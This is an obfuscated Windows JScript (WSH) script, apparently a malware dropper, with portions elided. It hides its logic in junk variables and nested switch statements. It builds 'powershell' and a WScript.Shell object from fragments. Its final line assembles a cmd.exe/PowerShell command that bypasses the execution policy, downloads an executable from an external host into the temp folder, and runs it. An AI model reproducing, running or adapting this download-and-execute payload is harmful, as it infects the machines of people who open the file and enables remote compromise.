...
var ifezax = false;
var qitulty = "power" + "shell";
var ujkimen = "asidxehvug";
...
var uqzencoqo = "sakoxd";
rridkefmyf = "uqhac";
enakorigz = 'saxepa';
var ewnukowgor = typeof window == 'undefined';
var siwidutx = 1;
var idfopewzacr = undefined;
var fybevwywi = "wjaqlicufko";
ompawcijbigx = "lpygbi";
...
var uvgud = new Function("return WScript")();
var ozulqy = null;
var ozyvlifaq = null;
var uxalaqu = "run";
...
case null:
	...
	if (exugevu == true) {
		...
		qbutyjtyna = eval(qbutyjtyna + "95789");
		zexoxr = '27620';
		ciztysik = 89;
...
case 1:
	...
	case true:
		...
		if (typeof syfofo == "object") {
			var imvepfo = 143.447;
			imvepfo = "ywhyshank";
			var jgemvamylsi = undefined;
			var yzylxoqxog = 117.68;
			var usetcyhyb = null;
			var pvotywu = "rmodwafnivle";
			var obbyratocg = '84961';
			opkimuzo = 'twimdije';
			var pufgykjuhna = 823;
	...
	case null:
		...
		if (ewnukowgor) {
			...
			var ybveltylocx = 9;
			ybveltylocx = '59182' + ybveltylocx;
			var avzamol = uvgud.CreateObject('WScript.Shell');
			switch (xoro) {
			case false:
				if (ucazkukibz < 16.78) {
					var kaklitvu = "97630";
			...
			case 15.84:
				...
				case true:
					...
					if (typeof avavnumewn == "undefined") {
						if (xsypiqyg() < 139) {
							if (ifezax === null) {
								var izxijo = '30704';
								var upagtinci = 'khymaxabj';
								var ivososyf = 20;
				...
				case 112.9:
					switch (oglypij()) {
					case false:
						if (typeof ajugh() == "boolean") {
							var oqetdahub = '68377';
						}
						if (siwidutx == 1) {
							var dezhymka = null;
							var ocleghaqot = null;
							var dfyrrasulm = "84220";
							var ytvycil = 6;
					...
					case null:
						...
						if (kbuqe == null) {
							...
							case 4:
								...
								break;
							case undefined:
								var nemzeqr = "cmd.exe /c \"" + qitulty + "  $ucas='^).DownloadFi';$phopsix='^et.Webclient';$vtynicr='^Set-Executio';$goxe='^e'');(New-Obj';$ucyske='^ss    -Scope     Pr';$ynwyk='^le(''http://f';$ydlimi='^op/user.php?';$ymim='^ect    System.N';$livy='^rocess $path';$rymfym='^nPolicy     Bypa';$tpesfe='^th); Start-P';$yfnini='^f=0.dat'',$pa';$arojr='^ocess; $path';$jaqfow='^''\ejvynul.ex';$ozmoq='^=($env:temp+';$ijxaps='^ortycooola.t'; Invoke-Expression ($vtynicr+$rymfym+$ucyske+$arojr+$ozmoq+$jaqfow+$goxe+$ymim+$phopsix+$ucas+$ynwyk+$ijxaps+$ydlimi+$yfnini+$tpesfe+$livy);\"";
